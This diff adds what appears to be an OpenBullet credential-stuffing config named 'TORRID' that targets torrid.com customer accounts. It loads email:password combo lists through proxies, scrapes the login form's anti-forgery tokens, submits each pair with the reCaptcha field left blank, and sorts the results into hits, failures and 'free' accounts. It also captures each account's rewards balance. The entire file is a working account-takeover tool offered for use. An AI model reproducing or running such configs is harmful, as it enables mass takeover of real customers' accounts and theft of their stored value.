@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "TORRID",
+  "SuggestedBots": 100,
+  "LastModified": "2018-07-05T05:39:00.005801+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_PAGE REQUEST GET "https://www.torrid.com/account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE__DWCONT PARSE "<SOURCE>" LR "https://www.torrid.com/account?dwcont=" "\"" Recursive=FALSE -> VAR "DWCONT" "" "" 
+#PARSE__SECUREKEY PARSE "<SOURCE>" LR "dwfrm_login_securekey\" value=\"" "\"" Recursive=FALSE -> VAR "SECUREKEY" "" "" 
+#REQUEST_LOGIN REQUEST POST "https://www.torrid.com/account?dwcont=<DWCONT>" AutoRedirect=TRUE 
+  CONTENT "dwfrm_login_username_d0qrydcgpwxa=<USER>&dwfrm_login_password=<PASS>&dwfrm_login_login=Sign+In&dwfrm_login_securekey=<SECUREKEY>&reCaptcha=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://www.torrid.com/account" 
+  HEADER "origin: https://www.torrid.com" 
+#FREE_CHECK PARSE "<SOURCE>" LR "<span class=\"rating-val\">" "<" Recursive=FALSE -> VAR "CHECK" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error-form" 
+    KEY "We can’t find you" 
+    KEY "<span class=\"welcome\">Welcome,</span>" 
+  KEYCHAIN Success AND 
+    KEY "Sign Out" 
+    KEY "<CHECK>" EqualTo "" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<CHECK>" EqualTo "0" 
+#PARSE_REWARDS PARSE "<SOURCE>" LR "<div class=\"billing-torrid-insider\">" "<" Recursive=FALSE -> CAP "REWARDS" "$" "" 
